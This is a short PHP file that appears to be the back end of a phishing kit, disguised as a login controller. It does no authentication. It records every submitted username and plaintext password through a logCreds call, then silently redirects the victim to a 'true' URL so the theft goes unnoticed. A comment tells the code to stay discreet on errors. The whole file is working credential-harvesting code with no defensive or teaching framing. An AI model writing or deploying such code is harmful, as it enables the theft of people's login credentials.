<?php
require_once __DIR__ . '/../services/Logger.php';
require_once __DIR__ . '/../config.php';

class LoginController {
    
    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            $this->redirect('/login');
        }

        try {
            $this->processLogin();
        } catch (Exception $e) {
            // En cas d'erreur, on reste discret
            error_log($e->getMessage());
            $this->redirect('/login?error=1');
        }
    }

    private function processLogin() {
        $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_SPECIAL_CHARS) ?? 'inconnu';
        $password = $_POST['password'] ?? '';

        Logger::logCreds($username, ['password' => $password]);

        $this->redirect(TRUE_URL);
    }

    private function redirect($url) {
        header("Location: $url");
        exit();
    }
}